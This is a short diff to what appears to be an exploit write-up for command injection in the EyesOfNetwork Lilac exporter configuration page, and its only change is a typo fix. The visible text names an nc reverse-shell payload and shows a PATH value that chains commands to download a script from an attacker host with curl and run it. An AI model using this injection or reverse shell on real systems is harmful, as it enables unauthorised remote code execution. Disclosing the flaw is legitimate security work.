@@ -25,7 +25,7 @@ Create a bash script for payload (exemple : nc -e /bin/sh LHOST LPORT) and start
 
 Go on EyesOfNetwork Lilac exporter config page : https://RHOST/lilac/export.php.
 
-Create a new config and modify the "PATH" (at the end of the webpage) and put the commande afetr the original line like that for exemple : 
+Create a new config and modify the "PATH" (at the end of the webpage) and put the commande after the original line like that for exemple : 
 ```
 /srv/eyesofnetwork/nagios/bin/nagios -v /tmp/lilac-export-33/nagios.cfg && curl http://LHOST:LPORT/test.sh -o /tmp/lilac-export-2/test.sh && chmod +x /tmp/lilac-export-2/test.sh && cd /tmp/lilac-export-2/ && ./test.sh
 ```
